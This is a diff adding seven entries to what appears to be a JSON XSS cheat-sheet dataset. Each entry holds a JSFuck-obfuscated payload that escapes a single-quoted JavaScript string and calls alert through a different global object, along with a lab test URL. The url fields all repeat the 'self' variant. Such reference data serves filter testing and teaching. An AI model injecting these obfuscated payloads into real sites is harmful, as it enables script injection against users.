@@ -586,5 +586,89 @@
             "safari"
         ],
         "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (window)",
+        "code": "';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (self)",
+        "code": "';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (this)",
+        "code": "';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (top)",
+        "code": "';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (parent)",
+        "code": "';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (frames)",
+        "code": "';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (globalThis)",
+        "code": "';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
+        "url": "http:\/\/portswigger-labs.net\/xss\/xss.php?x=%27;self[(%2b{}%2b[])[%2b!![]]%2b(![]%2b[])[!%2b[]%2b!![]]%2b([][[]]%2b[])[!%2b[]%2b!![]%2b!![]]%2b(!![]%2b[])[%2b!![]]%2b(!![]%2b[])[%2b[]]]((%2b{}%2b[])[%2b!![]])\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "context": "js_string_single"
     }
 ]
